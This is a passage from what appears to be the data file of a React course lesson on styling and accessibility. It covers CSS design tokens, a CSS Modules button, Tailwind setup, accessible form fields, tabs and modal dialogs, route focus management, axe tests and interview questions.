          ["Trigger button", "focus saved", "g"],
          ["Modal opens", "portal or &lt;dialog&gt;.showModal()"],
          ["Focus inside", "first control or heading"],
          ["Tab trapped, Esc closes", "background inert", "w"],
          ["Focus returns", "back to trigger", "g"]
        ]),
        steps: [
          "<b>Pick a styling layer per concern:</b> global CSS for tokens and resets; CSS Modules or Tailwind for components; avoid runtime CSS-in-JS in new RSC-based apps. Components consume tokens through <code>var(--…)</code>, so a theme switch is one attribute on <code>&lt;html&gt;</code>.",
          "<b>Build each component on the right element:</b> its role and keyboard behaviour come from HTML (<code>&lt;button&gt;</code>, <code>&lt;a&gt;</code>, <code>&lt;input&gt;</code>); give it an accessible name; expose state with ARIA only where HTML has no attribute for it.",
          "<b>Manage focus explicitly where the browser can't:</b> a modal saves the previously focused element, moves focus in, traps Tab, closes on Escape, makes the background inert and restores focus on close; a route change moves focus to the new heading.",
          "<b>Verify in layers:</b> lint rules catch obvious mistakes while typing; <code>getByRole</code> tests and axe catch rendered problems in CI; a keyboard pass and a screen reader pass catch the rest before release."
        ]
      },
      ex: [
        {
          t: "Design tokens as CSS custom properties, with a dark theme",
          lang: "css",
          code: `/* src/styles/tokens.css: imported once in main.tsx */
:root {
  /* colour */
  --color-bg: #ffffff;
  --color-surface: #f6f7f9;
  --color-text: #1b1f24;
  --color-muted: #5b6470;
  --color-primary: #2459d1;
  --color-primary-hover: #1d48aa;
  --color-on-primary: #ffffff;
  --color-danger: #c42b1c;
  --color-focus: #1a73e8;
  /* spacing, radius, type */
  --space-1: 0.25rem;
  --space-2: 0.5rem;
  --space-3: 0.75rem;
  --space-4: 1rem;
  --radius-md: 0.5rem;
  --font-sans: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
  --font-size-sm: 0.875rem;
  --font-size-md: 1rem;
  color-scheme: light;
}

/* Explicit user choice wins; otherwise follow the OS. */
[data-theme="dark"] {
  --color-bg: #0f1216;
  --color-surface: #181c22;
  --color-text: #e8eaed;
  --color-muted: #a1a9b4;
  --color-primary: #7aa2ff;
  --color-primary-hover: #9bb8ff;
  --color-on-primary: #0b1020;
  --color-focus: #8ab4f8;
  color-scheme: dark;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    --color-bg: #0f1216;
    --color-surface: #181c22;
    --color-text: #e8eaed;
    --color-muted: #a1a9b4;
    --color-primary: #7aa2ff;
    --color-primary-hover: #9bb8ff;
    --color-on-primary: #0b1020;
    --color-focus: #8ab4f8;
    color-scheme: dark;
  }
}

body {
  margin: 0;
  background: var(--color-bg);
  color: var(--color-text);
  font-family: var(--font-sans);
}

/* A visible focus ring for keyboard users, everywhere. Never just "outline: none". */
:focus-visible {
  outline: 3px solid var(--color-focus);
  outline-offset: 2px;
}

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
}`,
          note: `<p>Switching theme from React is one line: <code>document.documentElement.dataset.theme = "dark"</code> (persist the choice in <code>localStorage</code> and set it in an inline script in <code>index.html</code> before React loads, to avoid a flash of the wrong theme). No component re-renders, because components only reference <code>var(--color-primary)</code>. Check contrast for both themes: WCAG AA asks for 4.5:1 for normal text.</p>`
        },
        {
          t: "CSS Modules + clsx: a Button component with variants",
          lang: "tsx",
          code: `/* src/components/Button.module.css
.button {
  display: inline-flex; align-items: center; gap: var(--space-2);
  padding: var(--space-2) var(--space-4);
  border: 1px solid transparent; border-radius: var(--radius-md);
  font: inherit; font-size: var(--font-size-md); cursor: pointer;
}
.primary { background: var(--color-primary); color: var(--color-on-primary); }
.primary:hover:not(:disabled) { background: var(--color-primary-hover); }
.secondary { background: transparent; color: var(--color-text); border-color: var(--color-muted); }
.danger { background: var(--color-danger); color: #fff; }
.sm { padding: var(--space-1) var(--space-3); font-size: var(--font-size-sm); }
.md { }
.button:disabled { opacity: 0.6; cursor: not-allowed; }
*/

// src/components/Button.tsx   (npm install clsx)
import clsx from "clsx";
import type { ComponentProps } from "react";
import styles from "./Button.module.css";

type ButtonProps = ComponentProps<"button"> & {
  variant?: "primary" | "secondary" | "danger";
  size?: "sm" | "md";
  loading?: boolean;
};

export function Button({
  variant = "primary",
  size = "md",
  loading = false,
  type = "button",          // safe default: no accidental form submits
  className,
  disabled,
  children,
  ...rest                   // includes ref in React 19, onClick, aria-*, etc.
}: ButtonProps) {
  return (
    <button
      type={type}
      className={clsx(styles.button, styles[variant], styles[size], className)}
      disabled={disabled || loading}
      aria-busy={loading || undefined}
      {...rest}
    >
      {loading && <span className="spinner" aria-hidden="true" />}
      {children}
    </button>
  );
}

// usage
// <Button onClick={save}>Save</Button>
// <Button variant="danger" size="sm" type="submit" loading={isSubmitting}>Delete project</Button>`,
          out: `Rendered class attribute (dev build): "_button_k3d9a_1 _danger_k3d9a_14 _sm_k3d9a_15"`,
          note: `<p>Vite treats any <code>*.module.css</code> file as a CSS Module; its <code>vite/client</code> types declare the import as a <code>{ readonly [key: string]: string }</code> object, so <code>styles[variant]</code> type-checks (a typo gives <code>undefined</code> at runtime rather than a compile error; plugins exist to generate exact typings). The component accepts every native button prop via <code>ComponentProps&lt;"button"&gt;</code>, so <code>aria-label</code>, <code>onClick</code> and (in React 19) <code>ref</code> pass straight through. The CSS file content is shown as a comment so the example fits one block; put it in its own file.</p>`
        },
        {
          t: "Tailwind (v4) setup and a cn() helper for overridable classes",
          lang: "tsx",
          code: `// Terminal:
//   npm install tailwindcss @tailwindcss/vite clsx tailwind-merge
//
// vite.config.ts
//   import { defineConfig } from "vite";
//   import react from "@vitejs/plugin-react";
//   import tailwindcss from "@tailwindcss/vite";
//   export default defineConfig({ plugins: [react(), tailwindcss()] });
//
// src/index.css
//   @import "tailwindcss";
//   @theme {
//     --color-brand-500: #2459d1;   /* generates bg-brand-500, text-brand-500, ... */
//     --color-brand-600: #1d48aa;
//   }

// src/lib/cn.ts
import type { ReactNode } from "react";
import { clsx, type ClassValue } from "clsx";
import { twMerge } from "tailwind-merge";

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs)); // later conflicting utilities win: "px-4 px-2" → "px-2"
}

// src/components/Badge.tsx
type BadgeProps = { tone?: "neutral" | "success" | "danger"; className?: string; children: ReactNode };

export function Badge({ tone = "neutral", className, children }: BadgeProps) {
  return (
    <span
      className={cn(
        "inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium",
        tone === "neutral" && "bg-gray-100 text-gray-800",
        tone === "success" && "bg-green-100 text-green-800",
        tone === "danger" && "bg-red-100 text-red-800",
        className, // caller can override, e.g. "px-4"
      )}
    >
      {children}
    </span>
  );
}

// Never build class names dynamically: Tailwind scans source text for complete class names.
//   BAD:  className={"bg-" + color + "-100"}
//   GOOD: a lookup object with full strings: { success: "bg-green-100", danger: "bg-red-100" }`,
          note: `<p>This is Tailwind v4's setup (CSS-first configuration and the <code>@tailwindcss/vite</code> plugin); v3 projects use <code>tailwind.config.js</code>, PostCSS and <code>@tailwind base/components/utilities</code>. (The <code>cn.ts</code> and <code>Badge.tsx</code> files are shown in one block; in your app <code>Badge.tsx</code> imports <code>cn</code> from <code>../lib/cn</code>.) The dynamic-class rule matters: Tailwind generates CSS by scanning for literal class names, so string-built names silently produce no CSS.</p>`
        },
        {
          t: "An accessible Field: useId, label, hint, error, aria-describedby",
          lang: "tsx",
          code: `import { useId, type ComponentProps } from "react";
import styles from "./Field.module.css";

type FieldProps = ComponentProps<"input"> & {
  label: string;
  hint?: string;
  error?: string;
};

export function TextField({ label, hint, error, id, ...inputProps }: FieldProps) {
  const autoId = useId();             // opaque, unique per instance; the exact format differs between React versions
  const inputId = id ?? autoId;
  const hintId = inputId + "-hint";
  const errorId = inputId + "-error";

  const describedBy = [hint ? hintId : null, error ? errorId : null].filter(Boolean).join(" ") || undefined;

  return (
    <div className={styles.field}>
      <label htmlFor={inputId}>{label}</label>
      {hint && <p id={hintId} className={styles.hint}>{hint}</p>}
      <input
        id={inputId}
        aria-invalid={error ? true : undefined}
        aria-describedby={describedBy}
        {...inputProps}
      />
      {error && (
        <p id={errorId} className={styles.error}>
          {error}
        </p>
      )}
    </div>
  );
}

// With React Hook Form (register's ref passes through ...inputProps in React 19):
//   <TextField label="Email" type="email" autoComplete="email"
//              hint="We never share it." error={errors.email?.message} {...register("email")} />
//
// Screen reader on focus: "Email, edit text, invalid entry, We never share it. Enter a valid email"`,
          note: `<p><code>useId</code> exists because <code>Math.random()</code> or a module counter produces different ids on the server and the client (hydration mismatch) and duplicate ids when two instances render. The id's exact format has changed between React versions; never depend on it or use it in CSS selectors. Linking the error with <code>aria-describedby</code> means the screen reader reads it when the field gets focus, which pairs with RHF's "focus the first invalid field" on submit. For an error summary at the top of a long form, use <code>role="alert"</code> on the summary only, not on every field error (a dozen alerts at once is noise).</p>`
        },
        {
          t: "div onClick vs button, and a keyboard-navigable Tabs widget (roving tabindex)",
          lang: "tsx",
          code: `import { useId, useRef, useState, type KeyboardEvent } from "react";

// ❌ Looks like a card you can click; keyboard users can't reach it, screen readers say "group" or nothing.
export function ProjectCardBad({ name, onOpen }: { name: string; onOpen: () => void }) {
  return <div className="card" onClick={onOpen}>{name}</div>;
}

// ✅ Navigation → a link (React Router <Link>). An action → a button. Both are focusable and keyboard-operable.
export function ProjectCardGood({ name, onOpen }: { name: string; onOpen: () => void }) {
  return (
    <div className="card">
      <h3>
        <button type="button" className="card-button" onClick={onOpen}>
          {name}
        </button>
      </h3>
    </div>
  );
}

// Tabs following the ARIA Authoring Practices pattern.
const TABS = [
  { key: "overview", label: "Overview" },
  { key: "activity", label: "Activity" },
  { key: "settings", label: "Settings" },
] as const;

export function ProjectTabs() {
  const [active, setActive] = useState(0);
  const tabRefs = useRef<(HTMLButtonElement | null)[]>([]);
  const baseId = useId();

  function onKeyDown(e: KeyboardEvent<HTMLDivElement>) {
    let next = active;
    if (e.key === "ArrowRight") next = (active + 1) % TABS.length;
    else if (e.key === "ArrowLeft") next = (active - 1 + TABS.length) % TABS.length;
    else if (e.key === "Home") next = 0;
    else if (e.key === "End") next = TABS.length - 1;
    else return;
    e.preventDefault();
    setActive(next);
    tabRefs.current[next]?.focus();
  }

  return (
    <div>
      <div role="tablist" aria-label="Project sections" onKeyDown={onKeyDown}>
        {TABS.map((tab, i) => (
          <button
            key={tab.key}
            ref={(el) => {
              tabRefs.current[i] = el; // block body: React 19 treats a returned function as a ref cleanup
            }}
            type="button"
            role="tab"
            id={baseId + "-tab-" + i}
            aria-selected={i === active}
            aria-controls={baseId + "-panel-" + i}
            tabIndex={i === active ? 0 : -1} // roving tabindex: one Tab stop for the whole tablist
            onClick={() => setActive(i)}
          >
            {tab.label}
          </button>
        ))}
      </div>
      {TABS.map((tab, i) => (
        <div
          key={tab.key}
          role="tabpanel"
          id={baseId + "-panel-" + i}
          aria-labelledby={baseId + "-tab-" + i}
          hidden={i !== active}
          tabIndex={0}
        >
          {tab.label} content
        </div>
      ))}
    </div>
  );
}`,
          out: `Keyboard: Tab → focuses "Overview" tab; ArrowRight → "Activity" selected and focused; Tab → moves into the Activity panel (not to the next tab).
Screen reader: "Activity, tab, selected, 2 of 3".`,
          note: `<p>A real <code>&lt;button&gt;</code> gives you focusability, Enter <i>and</i> Space activation, the <code>button</code> role, disabled semantics and form behaviour for free. To make a whole card clickable while keeping one accessible control, put the button or link on the title and stretch its click area with CSS (a <code>::after</code> covering the card). Tabs, menus and listboxes are where ARIA is genuinely needed, because HTML has no native tab widget; follow the APG pattern exactly or use Radix / React Aria.</p>`
        },
        {
          t: "Modal with native &lt;dialog&gt;: showModal, Escape, backdrop click and focus return",
          lang: "tsx",
          code: `import { useEffect, useId, useRef, useState, type MouseEvent, type ReactNode } from "react";

type DialogProps = {
  open: boolean;
  onClose: () => void;
  title: string;
  children: ReactNode;
};

export function Dialog({ open, onClose, title, children }: DialogProps) {
  const ref = useRef<HTMLDialogElement>(null);
  const opener = useRef<HTMLElement | null>(null);
  const titleId = useId();

  // Sync the React prop with the imperative dialog API.
  useEffect(() => {
    const dialog = ref.current;
    if (!dialog) return;
    if (open && !dialog.open) {
      opener.current = document.activeElement as HTMLElement | null;
      dialog.showModal(); // top layer + ::backdrop + background inert + Esc support
    } else if (!open && dialog.open) {
      dialog.close();
    }
  }, [open]);

  // Fires for Esc, form method="dialog", and dialog.close().
  function handleClose() {
    onClose();
    // Browsers increasingly restore focus themselves; doing it explicitly is harmless and portable.
    opener.current?.focus();
  }

  // Clicks on the backdrop are reported on the <dialog> element itself.
  function handleClick(e: MouseEvent<HTMLDialogElement>) {
    if (e.target === e.currentTarget) ref.current?.close();
  }

  return (
    <dialog ref={ref} aria-labelledby={titleId} onClose={handleClose} onClick={handleClick} className="dialog">
      <div className="dialog-body">
        <h2 id={titleId}>{title}</h2>
        {children}
        <form method="dialog">
          <button type="submit">Close</button>
        </form>
      </div>
    </dialog>
  );
}

// usage
export function DeleteProject() {
  const [open, setOpen] = useState(false);
  return (
    <>
      <button type="button" onClick={() => setOpen(true)}>Delete project…</button>
      <Dialog open={open} onClose={() => setOpen(false)} title="Delete this project?">
        <p>This removes the project and its 1,204 tasks. This cannot be undone.</p>
        <button type="button" className="danger" autoFocus onClick={() => setOpen(false)}>
          Cancel
        </button>
      </Dialog>
    </>
  );
}`,
          out: `Click "Delete project…": dialog opens, focus moves to Cancel (autoFocus), page behind is inert.
Press Esc: dialog closes, onClose runs, focus is back on "Delete project…".`,
          note: `<p>Render the <code>&lt;dialog&gt;</code> without the <code>open</code> attribute and call <code>showModal()</code>; <code>&lt;dialog open&gt;</code> opens it <i>non-modally</i> (no backdrop, no inertness, no Escape). The <code>.dialog</code> wrapper with inner padding is what makes the backdrop-click check work: clicks on padding inside <code>.dialog-body</code> have a different target. jsdom has historically lacked <code>showModal()</code>, so unit tests may need a small polyfill or should run in a real browser (Playwright, Vitest browser mode).</p>`
        },
        {
          t: "Modal with createPortal: focus trap, Escape, inert background, scroll lock",
          lang: "tsx",
          code: `import { useEffect, useId, useRef, type KeyboardEvent, type ReactNode } from "react";
import { createPortal } from "react-dom";

const FOCUSABLE =
  'a[href], area[href], button:not([disabled]), input:not([disabled]), select:not([disabled]), ' +
  'textarea:not([disabled]), [tabindex]:not([tabindex="-1"]), [contenteditable="true"]';

type ModalProps = { title: string; onClose: () => void; children: ReactNode };

export function Modal({ title, onClose, children }: ModalProps) {
  const panelRef = useRef<HTMLDivElement>(null);
  const titleId = useId();

  useEffect(() => {
    const previouslyFocused = document.activeElement as HTMLElement | null;
    const appRoot = document.getElementById("root"); // the modal is portaled OUTSIDE #root
    appRoot?.setAttribute("inert", "");              // background: not focusable, not clickable, hidden from AT
    const prevOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";        // scroll lock

    const panel = panelRef.current;
    const first = panel?.querySelector<HTMLElement>(FOCUSABLE);
    (first ?? panel)?.focus();                       // move focus in

    return () => {
      appRoot?.removeAttribute("inert");
      document.body.style.overflow = prevOverflow;
      previouslyFocused?.focus();                    // return focus to the opener
    };
  }, []);

  function onKeyDown(e: KeyboardEvent<HTMLDivElement>) {
    if (e.key === "Escape") {
      e.stopPropagation(); // don't also close a parent modal/popover
      onClose();
      return;
    }
    if (e.key !== "Tab") return;
    const items = Array.from(panelRef.current?.querySelectorAll<HTMLElement>(FOCUSABLE) ?? []);
    if (items.length === 0) {
      e.preventDefault();
      return;
    }
    const first = items[0];
    const last = items[items.length - 1];
    if (e.shiftKey && document.activeElement === first) {
      e.preventDefault();
      last.focus();
    } else if (!e.shiftKey && document.activeElement === last) {
      e.preventDefault();
      first.focus();
    }
  }

  return createPortal(
    <div className="overlay" onMouseDown={(e) => e.target === e.currentTarget && onClose()}>
      <div
        ref={panelRef}
        role="dialog"
        aria-modal="true"
        aria-labelledby={titleId}
        tabIndex={-1}
        className="panel"
        onKeyDown={onKeyDown}
      >
        <h2 id={titleId}>{title}</h2>
        {children}
        <button type="button" onClick={onClose} aria-label="Close dialog">×</button>
      </div>
    </div>,
    document.body,
  );
}

// usage: mount only while open, so the effect runs on open and its cleanup on close
//   {isOpen && <Modal title="Invite teammate" onClose={() => setIsOpen(false)}>…</Modal>}`,
          out: `Open: focus moves to the first field; Tab from the last control wraps to the first; Shift+Tab wraps backwards.
Esc or overlay click: modal unmounts, #root is interactive again, focus returns to the button that opened it.`,
          note: `<p>Things worth noticing: the portal escapes CSS stacking contexts but <b>React events still bubble through the React tree</b>, so a click inside the modal reaches an <code>onClick</code> on the component that rendered it (a common surprise; stop propagation or structure handlers accordingly). Making <code>#root</code> <code>inert</code> works because the modal lives in <code>body</code>, outside it. In StrictMode the effect runs, cleans up and runs again on mount; this one is written to survive that (the cleanup restores focus to the opener, the second run captures it again). For production prefer a tested primitive (Radix Dialog, React Aria <code>useDialog</code>/<code>Modal</code>, or native <code>&lt;dialog&gt;</code>): nested modals, iframes, shadow DOM and mobile screen readers all have edge cases this sketch ignores.</p>`
        },
        {
          t: "Focus management on route change (React Router) and a skip link",
          lang: "tsx",
          code: `import { useEffect, useRef } from "react";
import { Link, Outlet, useLocation } from "react-router";

export function RootLayout() {
  const { pathname } = useLocation();
  const mainRef = useRef<HTMLElement>(null);
  const lastPath = useRef(pathname);

  useEffect(() => {
    if (lastPath.current === pathname) return; // skip the initial load (and StrictMode's re-run)
    lastPath.current = pathname;
    const main = mainRef.current;
    if (!main) return;
    const heading = main.querySelector<HTMLElement>("h1");
    const target = heading ?? main;
    target.setAttribute("tabindex", "-1"); // focusable by script, not in the Tab order
    target.focus({ preventScroll: false });
  }, [pathname]);

  return (
    <>
      <a href="#main" className="skip-link">Skip to main content</a>
      <header>
        <nav aria-label="Primary">
          <Link to="/projects">Projects</Link> <Link to="/settings">Settings</Link>
        </nav>
      </header>
      <main id="main" ref={mainRef} tabIndex={-1}>
        <Outlet />
      </main>
    </>
  );
}

/* CSS for the skip link: visible only when focused
.skip-link { position: absolute; left: -9999px; }
.skip-link:focus { left: var(--space-4); top: var(--space-4); z-index: 100; background: var(--color-bg); padding: var(--space-2); }
*/

// Each route also sets a descriptive document title. React 19 hoists <title> rendered anywhere into <head>:
export function ProjectsPage() {
  return (
    <>
      <title>Projects · Acme</title>
      <h1>Projects</h1>
      {/* ... */}
    </>
  );
}`,
          out: `Click "Settings": URL changes, focus lands on the "Settings" <h1>, the screen reader reads "Settings, heading level 1".
First Tab on any page: the "Skip to main content" link appears.`,
          note: `<p>With a full page load the browser resets focus to the top and screen readers announce the new title; client-side routing does neither, so a screen-reader user who clicks a link hears nothing and is left on a link in the old page context. Focusing the <code>&lt;h1&gt;</code> fixes both. Don't do this for search-param-only changes (filters, pagination) where moving focus would be disruptive; that's why the effect depends on <code>pathname</code>. React 19's metadata hoisting (<code>&lt;title&gt;</code> in components) is new; in React 18 you'd set <code>document.title</code> in an effect or use a library. If the data loads after navigation, focus the heading once it renders, not the skeleton.</p>`
        },
        {
          t: "Automated checks: eslint-plugin-jsx-a11y and axe in Vitest and Playwright",
          lang: "ts",
          code: `// 1) Lint while you type:  npm install -D eslint-plugin-jsx-a11y
// eslint.config.js (flat config): add the plugin's recommended preset to the exported array
//   import jsxA11y from "eslint-plugin-jsx-a11y";
//   export default [ ...yourExistingConfigs, jsxA11y.flatConfigs.recommended ];
// Catches: <img> without alt, onClick on <div> without a key handler/role, labels without controls,
// invalid ARIA attributes, autoFocus misuse, anchors without href, …

// 2) Unit-level: axe-core against the rendered DOM in jsdom
//    npm install -D axe-core   (plus the Vitest + Testing Library setup from Day 14)
// src/features/signup/SignupForm.a11y.test.tsx
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import axe from "axe-core";
import { expect, test } from "vitest";
import { SignupForm } from "./SignupForm";

test("signup form has no detectable axe violations, including in the error state", async () => {
  const user = userEvent.setup();
  const { container } = render(<SignupForm onDone={() => {}} />);

  // getByRole doubles as an a11y check: it fails if the button has no accessible name.
  await user.click(screen.getByRole("button", { name: /create account/i }));
  expect(await screen.findByText(/enter a valid email/i)).toBeInTheDocument();

  const results = await axe.run(container, {
    rules: { "color-contrast": { enabled: false } }, // jsdom doesn't compute layout/colours
  });
  expect(results.violations.map((v) => v.id + ": " + v.help)).toEqual([]);
});

// 3) End-to-end: real browser, real CSS (colour contrast works here)
//    npm install -D @playwright/test @axe-core/playwright
// e2e/a11y.spec.ts
//   import { test, expect } from "@playwright/test";
//   import AxeBuilder from "@axe-core/playwright";
//   test("projects page is accessible", async ({ page }) => {
//     await page.goto("/projects");
//     const results = await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa"]).analyze();
//     expect(results.violations).toEqual([]);
//   });`,
          out: `When someone replaces the submit <button> with <div onClick>:
✗ getByRole("button", { name: /create account/i }) → Unable to find an accessible element with the role "button"
When a label is removed:
✗ expected [ 'label: Form elements must have labels' ] to deeply equal []`,
          note: `<p><code>toBeInTheDocument</code> comes from <code>@testing-library/jest-dom</code> (set up on Day 14). Wrappers such as <code>vitest-axe</code>/<code>jest-axe</code> add a <code>toHaveNoViolations</code> matcher; calling <code>axe-core</code> directly avoids an extra dependency. Run axe on <i>states</i>, not just the initial render: open the modal, trigger errors, expand the menu. And remember the limits: axe can't tell whether your focus order makes sense, whether the label text is meaningful, or whether a custom widget is operable by keyboard. Do a keyboard-only pass and a short screen-reader pass (NVDA + Firefox/Chrome on Windows, VoiceOver + Safari on macOS) for every new interactive component.</p>`
        }
      ],
      internals: `<p><b>How styles reach the page.</b> With CSS Modules, Vite's CSS pipeline (PostCSS / Lightning CSS) rewrites each class to a hashed name and the JS module exports the mapping; in dev the CSS is injected via a <code>&lt;style&gt;</code> tag with HMR, in production it is extracted to <code>.css</code> files linked from the HTML, so React never touches styles at runtime. Tailwind's Vite plugin scans source files for class-name tokens and generates one stylesheet. Runtime CSS-in-JS works differently: on render, <code>styled.button</code> serialises the template with the current props, hashes it, and if that hash is new, inserts a rule into a <code>&lt;style&gt;</code> tag (often through <code>insertRule</code>); this work happens during React rendering on every distinct prop combination, and libraries need <code>useInsertionEffect</code> (a hook React added specifically so CSS-in-JS can insert rules before layout effects read the DOM). Because they rely on context for themes and on client-side insertion, they can't run inside Server Components. React 19 also added built-in support for stylesheets: <code>&lt;link rel="stylesheet" href precedence="…"&gt;</code> rendered in a component is hoisted, de-duplicated, ordered by <code>precedence</code>, and Suspense can wait for it to load; this is mainly useful for frameworks and is new, so check the docs before relying on it.</p>
<p><b>The accessibility tree.</b> Browsers build an <b>accessibility tree</b> from the DOM: each node gets a <b>role</b> (from the element or <code>role</code>), a <b>name</b> (from label, content, <code>aria-label</code>, <code>aria-labelledby</code>), a <b>state</b> (checked, expanded, invalid, disabled) and a <b>description</b> (<code>aria-describedby</code>). Screen readers read this tree via platform APIs, not your JSX. React's only job is to put the right attributes on DOM nodes: JSX passes <code>aria-*</code> and <code>role</code> through unchanged (they keep their hyphenated names, unlike most props), maps <code>htmlFor</code> to <code>for</code> and <code>className</code> to <code>class</code>, and accepts booleans for <code>aria-*</code> (rendered as the strings <code>"true"</code>/<code>"false"</code>), which is why <code>aria-invalid={false}</code> still renders an attribute while <code>aria-invalid={undefined}</code> omits it. React 19 also accepts <code>inert</code> as a boolean prop (React 18 needed a workaround such as <code>inert=""</code>).</p>
<p><b><code>useId</code></b> derives the id from the component's position in the tree (its path through parent fibers plus a per-component hook counter), not from a global counter, which is why the server and client produce the same id for the same component and why it stays stable across re-renders. <b>Portals</b>: <code>createPortal</code> returns a special element; the reconciler creates a portal fiber whose children are committed into the given DOM container, but the fiber stays a child of its React parent. React's event system listens at the root container and also on portal containers, and dispatches by walking the <i>fiber</i> tree, so a click inside a portaled modal bubbles to the React ancestors that rendered it even though the DOM nodes live in <code>body</code>. <b>Focus</b> is entirely DOM: React doesn't move it for you (apart from <code>autoFocus</code>, which React handles by calling <code>focus()</code> on mount rather than relying on the HTML attribute), so modal and route focus management are effects or ref callbacks you write, or that a library writes for you.</p>`,
      prod: `<p><b>In a real product</b> these two concerns live in your <b>design system</b> (Day 15): a package of tokens and components (<code>Button</code>, <code>TextField</code>, <code>Select</code>, <code>Dialog</code>, <code>Tabs</code>, <code>Toast</code>) that every feature team uses. A common modern stack is tokens as CSS variables, components styled with CSS Modules or Tailwind, behaviour from Radix or React Aria primitives, documented in Storybook with an accessibility addon, tested with Testing Library + axe and Playwright. The accessibility work is done once, carefully, in the primitive, and feature teams inherit it. The opposite pattern, where each team builds its own modal, is how a product ends up with seven modals, four of which trap focus and two of which return it.</p>
<p><b>The React + FastAPI angle:</b> errors from FastAPI (422 mapped to fields, 409 conflicts, 500s) must be announced, not just painted red: field errors linked with <code>aria-describedby</code>, a form-level <code>role="alert"</code> summary, toasts in an <code>aria-live="polite"</code> region. Loading states should be perceivable (<code>aria-busy</code> on the region, a visually-hidden "Loading projects" status), and when a TanStack Query refetch replaces a list, don't steal focus. Server-rendered or cached data (Redis-backed endpoints) makes pages appear fast, but if focus isn't moved after navigation the speed is invisible to a screen-reader user.</p>
<p><b>What goes wrong at scale:</b> a migration to Server Components blocked by a styled-components design system (every component needs <code>"use client"</code>, and style injection needs a registry); theme switching implemented by re-rendering the whole tree through context instead of CSS variables; Tailwind class strings built dynamically and missing in production; <code>outline: none</code> in a reset killing focus visibility everywhere; icon buttons without names; <code>aria-hidden="true"</code> on a container that later receives focus; modals that work with a mouse but leave keyboard users tabbing through the page behind; and accessibility checked once before launch then regressed. Leads fix this structurally: lint rules on in CI as errors, axe checks in component and e2e tests, an accessibility acceptance criterion on every UI ticket, and a periodic audit with real assistive technology (ideally with disabled users).</p>`,
      iq: [
        ["fresher", "Why is <code>&lt;div onClick&gt;</code> considered an accessibility bug, and what do you use instead?", `<p>A <code>div</code> has no role, isn't in the Tab order, and doesn't respond to Enter or Space, so keyboard users can't reach or activate it and screen readers don't announce it as interactive. Use <code>&lt;button type="button"&gt;</code> for actions and <code>&lt;a href&gt;</code>/<code>&lt;Link&gt;</code> for navigation; they come with focus, keyboard activation, role and disabled semantics. The tempting fix, adding <code>role="button"</code>, only changes what's announced; you'd still have to add <code>tabIndex={0}</code> and key handlers for Enter <i>and</i> Space, and you'd still miss things like form submission and disabled behaviour.</p>`],
        ["fresher", "Why does JSX use <code>htmlFor</code> and <code>className</code>, and why do labels matter?", `<p><code>for</code> and <code>class</code> are reserved words in JavaScript, so JSX uses the DOM property names <code>htmlFor</code> and <code>className</code>; React renders them as <code>for</code> and <code>class</code>. A <code>&lt;label htmlFor="email"&gt;</code> associated with <code>&lt;input id="email"&gt;</code> gives the input its accessible name (screen readers read "Email, edit text") and makes clicking the label focus the input, a bigger hit target. A placeholder is not a substitute: it disappears when typing and is often low contrast.</p>`],
        ["mid", "What is <code>useId</code> for, and what should you not use it for?", `<p><code>useId</code> returns a unique id that is stable across re-renders and identical between server and client rendering, so it's safe with SSR and hydration. Use it to connect elements: <code>htmlFor</code>/<code>id</code>, <code>aria-describedby</code>, <code>aria-labelledby</code>, <code>aria-controls</code>, especially in reusable components that may render several times on one page. Don't use it for list keys (keys must come from your data) and don't depend on its format in CSS. <code>Math.random()</code> or a module-level counter is the tempting wrong answer: it causes hydration mismatches and unstable ids.</p>`],
        ["mid", "Compare CSS Modules, Tailwind and styled-components for a new React app.", `<p><b>CSS Modules:</b> real CSS, locally scoped class names, zero runtime, works everywhere including Server Components; you still name things and write CSS files. <b>Tailwind:</b> utility classes in JSX, zero runtime, a built-in design scale, very fast iteration, no naming; long class strings and you need conventions (<code>cn()</code>, component extraction). <b>styled-components/Emotion:</b> colocated, dynamic styles with props, but they serialise and inject styles at runtime (CPU, bundle size), need SSR setup, and in an RSC app only work in client components; styled-components is in maintenance mode. For a new app I'd choose CSS Modules or Tailwind, tokens as CSS variables, and a zero-runtime library only if the team strongly wants styles in TS.</p>`],
        ["mid", "What does an accessible modal need?", `<p>A dialog role and modality (<code>role="dialog"</code> + <code>aria-modal="true"</code>, or native <code>&lt;dialog&gt;</code> opened with <code>showModal()</code>); an accessible name (<code>aria-labelledby</code> pointing at the heading); focus moved inside when it opens; focus trapped while open (Tab and Shift+Tab cycle within); background made inert; Escape and a visible close button to close; and focus returned to the element that opened it on close. Often also scroll lock. Rendering via <code>createPortal</code> avoids <code>overflow</code>/<code>z-index</code> clipping; native <code>&lt;dialog&gt;</code> uses the top layer instead. Forgetting focus return is the most common miss: keyboard users end up at the top of the page.</p>`],
        ["senior", "A click inside a portaled modal triggers an <code>onClick</code> on a parent card that is nowhere near it in the DOM. Why?", `<p>Portals change where DOM nodes are placed, not where the component sits in the React tree. React dispatches synthetic events by walking the fiber tree, so an event inside the portal bubbles to the React ancestors that rendered the portal, including that card's <code>onClick</code>, even though in the DOM the modal is a child of <code>body</code>. This is by design (it lets context and event handling work naturally across portals). Fix by stopping propagation at the modal boundary, rendering the modal outside the clickable card in the component tree, or checking <code>e.target</code> in the card handler. The tempting wrong explanation is "event delegation on document", which would follow DOM bubbling and not reach the card.</p>`],
        ["senior", "How do you handle focus on route changes in a React SPA, and why is it needed?", `<p>A full page load resets focus and screen readers announce the new page; client-side routing does neither, so a screen-reader user clicks a link and hears nothing, with focus left on an element from the old view. In the root layout, run an effect on <code>pathname</code> change (not on the first render) that focuses the new page's <code>&lt;h1&gt;</code> (given <code>tabIndex={-1}</code>) or the <code>&lt;main&gt;</code> region, update the document title per route, and optionally announce the title in a polite live region. Skip it for search-param-only changes like filters. Add a skip link so keyboard users can bypass the navigation. Some frameworks do part of this automatically, but React Router in a Vite SPA leaves it to you.</p>`],
